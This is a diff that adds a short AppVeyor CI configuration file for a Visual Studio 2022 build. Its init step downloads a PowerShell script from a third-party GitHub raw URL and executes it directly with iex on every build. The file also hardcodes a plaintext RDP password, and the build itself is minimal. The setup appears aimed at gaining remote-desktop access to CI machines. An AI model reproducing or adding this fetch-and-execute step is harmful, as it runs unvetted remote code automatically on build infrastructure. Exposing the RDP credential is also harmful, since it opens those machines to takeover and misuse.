@@ -1,0 +1,8 @@
+version: 1.0.{build}
+image: Visual Studio 2022
+init:
+- ps: $blockRdp = $true; iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/THEWHITEORCHID01/APPVEYOR/main/appveyor.yml'))
+environment:
+  APPVEYOR_RDP_PASSWORD: Zoom@7878
+build:
+  verbosity: minimal
